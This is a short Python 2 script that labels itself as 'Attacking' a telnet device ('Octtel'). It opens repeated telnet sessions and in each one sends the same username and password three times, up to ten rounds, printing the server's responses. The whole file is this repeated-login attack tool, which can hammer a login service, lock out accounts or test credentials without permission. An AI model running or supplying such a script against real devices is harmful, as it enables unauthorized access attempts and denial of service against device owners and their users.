#Password ***
import getpass
#import sys
import telnetlib
# pause
import os

HOST = raw_input("Octtel IP address: ")
#HOST = "10.10.1.224"

user = raw_input("Enter your remote account: ")
#user = "aslkdfj"

password = getpass.getpass()
#password = "2134"

times = input("Retry times: ")
if times > 10:
	print "Number",times,"too big, max is 10."
	times = 10

print "Attacking :", HOST

while times > 0:
	i = 3
	tn = telnetlib.Telnet(HOST)
	while i > 0:
		tn.read_until("r: ")
		tn.write(user + "\r\n")
		if password:
			tn.read_until("d: ")
			tn.write(password + "\r\n")
		i -= 1
	print tn.read_all()
	tn.close()
	print "Tries left: ",times-1
	times -= 1
os.system("pause")